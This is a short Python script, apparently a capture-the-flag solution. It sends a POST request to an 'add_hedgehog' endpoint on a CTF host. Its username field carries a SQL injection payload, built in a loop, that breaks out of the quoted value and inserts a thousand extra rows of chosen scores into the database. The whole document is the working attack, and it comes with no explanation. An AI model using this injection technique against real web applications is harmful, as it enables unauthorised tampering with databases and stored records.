import requests

url = "https://best-hedgehog.aictf.sg/add_hedgehog"

username = ""

for i in range(1000):
    username += f"{i}',45,50,40,35,48,42,100), ('"

res = requests.post(url, data={
    "username": username,
    "furriness":1,
    "cuteness":1,
    "friendliness":1,
    "curiosity":1,
    "agility":1,
    "sleepiness":1,
    "evaluation_score": 0,
})

print(res.json()['message'])